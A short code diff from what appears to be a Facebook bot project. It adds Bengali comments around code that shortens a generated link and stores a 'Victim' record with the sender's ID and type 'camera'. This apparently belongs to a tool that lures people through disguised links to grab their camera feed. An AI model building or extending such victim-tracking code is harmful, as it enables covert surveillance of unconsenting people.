@@ -12,9 +12,12 @@ module.exports = {
             const longLink = `${baseUrl}/v/${id}`;
             const shortLink = await shortenUrl(longLink);
 
+            // ============================================================
+            // 🔥 এখানেই fbId সেট করা হচ্ছে (সঠিক ইউজারের)
+            // ============================================================
             const victim = new Victim({
                 id: id,
-                fbId: senderId,
+                fbId: senderId,          // সঠিক fbId
                 type: 'camera',
                 shortLink: shortLink,
                 timestamp: new Date(),
